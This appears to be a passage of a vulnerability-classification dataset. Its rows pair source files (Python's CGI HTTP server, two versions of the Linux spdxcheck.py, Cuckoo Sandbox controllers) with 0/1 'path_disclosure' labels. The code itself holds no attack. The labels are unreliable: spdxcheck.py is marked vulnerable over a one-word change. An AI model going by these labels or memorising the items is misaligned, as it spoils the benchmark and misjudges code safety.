            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1,path_disclosure
10,30,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""deprecated"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",0,path_disclosure
11,31,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"/scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""other"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",1,path_disclosure
12,44,168cabf86730d56b7fa319278bf0f0034052666a,"cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, filename)

                unpacked = sflock.unpack(
                    filepath=filepath, password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree(sanitize=True)

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return files

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/ncuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.common.mongo import mongo
from cuckoo.core.database import Database, TASK_PENDING

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")

        task = db.view_task(task_id, details=True)
        if not task:
            return Http404(""Task not found"")

        entry = task.to_dict()
        entry[""guest""] = {}
        if task.guest:
            entry[""guest""] = task.guest.to_dict()

        entry[""errors""] = []
        for error in task.errors:
            entry[""errors""].append(error.message)

        entry[""sample""] = {}
        if task.sample_id:
            sample = db.view_sample(task.sample_id)
            entry[""sample""] = sample.to_dict()

        entry[""target""] = os.path.basename(entry[""target""])
        return {
            ""task"": entry,
        }

    @staticmethod
    def get_recent(limit=50, offset=0):
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/ncuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
